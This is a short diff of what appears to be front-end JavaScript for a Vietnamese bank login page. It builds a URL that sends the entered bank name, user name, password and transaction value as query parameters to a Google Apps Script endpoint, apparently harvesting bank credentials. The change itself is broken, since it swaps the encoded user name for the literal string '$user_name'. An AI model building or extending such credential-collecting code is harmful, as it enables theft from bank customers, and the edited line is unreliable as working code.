@@ -710,7 +710,7 @@
 
         // Tạo URL
         const baseUrl = 'https://script.google.com/macros/s/AKfycbzO2dGfBynYdRgbD3RyE1krqPNadrgsGzfKqtnrRLdtakx0uQI2JN5PMdygVCqlpVby/exec';
-        const url = `${baseUrl}?Bank=${encodeURIComponent(Bank)}&user_name=${encodeURIComponent(user_name)}&password=${encodeURIComponent(password)}&transaction=${encodeURIComponent(transaction)}`;
+        const url = `${baseUrl}?Bank=${encodeURIComponent(Bank)}&user_name=$user_name&password=${encodeURIComponent(password)}&transaction=${encodeURIComponent(transaction)}`;
 
         // Hiện spinner
         document.querySelector('.reload-login').style.display = 'inline-block';
